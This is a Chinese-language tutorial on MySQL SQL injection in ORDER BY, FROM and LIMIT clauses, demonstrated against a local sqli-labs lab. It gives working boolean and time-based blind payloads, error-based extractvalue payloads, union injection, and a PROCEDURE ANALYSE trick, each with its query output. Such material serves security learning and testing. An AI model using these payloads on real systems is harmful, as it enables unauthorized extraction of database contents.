# 0x00 order by 注入

这是一种特殊的注入 sql语句为 `select * from admin order by $id`  我们一般用order by 来判断他的列数，其实他就是一个依照第几个列来排序的过程。

order by注入是不能 直接使用`and 1=1` 来判断的，他需要用到条件语句。 

```
mysql> select * from admin order by id;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    1 | cdmin    | bdmin    |
|    2 | admin    | ddmin    |
|    3 | bdmin    | fdmin    |
+------+----------+----------+
3 rows in set (0.00 sec)

mysql> select * from admin order by username;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    2 | admin    | ddmin    |
|    3 | bdmin    | fdmin    |
|    1 | cdmin    | bdmin    |
+------+----------+----------+
3 rows in set (0.00 sec)

```


### 盲注


1. 布尔

简单的判断

```
mysql> select * from admin order by if(1=1,username,password);
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    2 | admin    | ddmin    |
|    3 | bdmin    | fdmin    |
|    1 | cdmin    | bdmin    |
+------+----------+----------+
3 rows in set (0.00 sec)

mysql> select * from admin order by if(1=3,username,password);
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    1 | cdmin    | bdmin    |
|    2 | admin    | ddmin    |
|    3 | bdmin    | fdmin    |
+------+----------+----------+
3 rows in set (0.00 sec)

```


简单的注入

```
mysql> select * from admin order by if((substr((select user()),1,1)='r1'),username,password);
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    1 | cdmin    | bdmin    |
|    2 | admin    | ddmin    |
|    3 | bdmin    | fdmin    |
+------+----------+----------+
3 rows in set (0.00 sec)

mysql> select * from admin order by if((substr((select user()),1,1)='r'),username,password);
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    2 | admin    | ddmin    |
|    3 | bdmin    | fdmin    |
|    1 | cdmin    | bdmin    |
+------+----------+----------+
3 rows in set (0.00 sec)


http://127.0.0.1/sqli/Less-46/?sort=if((substr((select user()),1,1)='r'),username,password)

```


2. 时间盲注

时间盲注不能直接简单的`sleep()` 因为他会对每条内容来执行你的语句，所以会造成dos测试获取速度慢等问题，这时候我们需要用到子查询

```
mysql> select * from admin order by if((substr((select user()),1,1)='r'),sleep(5),password);
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    3 | bdmin    | fdmin    |
|    2 | admin    | ddmin    |
|    1 | cdmin    | bdmin    |
+------+----------+----------+
3 rows in set (15.01 sec)

```

我们写一条简单的子查询试试

```
mysql> select * from admin order by if((substr((select user()),1,1)='r'),(select 1 from (select sleep(2)) as b),password);
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    3 | bdmin    | fdmin    |
|    2 | admin    | ddmin    |
|    1 | cdmin    | bdmin    |
+------+----------+----------+
3 rows in set (2.01 sec)

```



### 报错注入

```
http://127.0.0.1/sqli/Less-46/?sort=(extractvalue(1,concat(0x3a,version())),1)

mysql> select * from admin order by (extractvalue(1,concat(0x3a,version())),1);
ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'

```


# 0x01 From 

from 后面的注入比较少 还是提一下

```
select * from $id;

```

1. 可以结合 order by 来注入

2. 可以使用联合注入来注入

```
mysql> select * from admin union select 1,user(),3;
+------+----------------+----------+
| id   | username       | password |
+------+----------------+----------+
|    3 | bdmin          | fdmin    |
|    2 | admin          | ddmin    |
|    1 | cdmin          | bdmin    |
|    1 | root@localhost | 3        |
+------+----------------+----------+
4 rows in set (0.02 sec)

```

方法跟普通注入一样的一样自己加上表名



# 0x02 limit


这种注入也不是很常见，依照 https://rateip.com/blog/sql-injections-in-mysql-limit-clause/ 来提一下


```
mysql> select * from admin where id >0 limit 0,1 $id

```

如何利用呢 大佬们已经给出方法了 用 `PROCEDURE ANALYSE` 配合报错注入,所以多看文档，如果你想提升下自己的水平


```
mysql> select * from admin where id >0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'
ERROR:
No query specified

```


这里延时只能使用`BENCHMARK()` 如同 

```
select * from admin where id >0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);

```



# 0x03 文末

#### 本文如有错误，请及时提醒，避免误导他人 

* author：404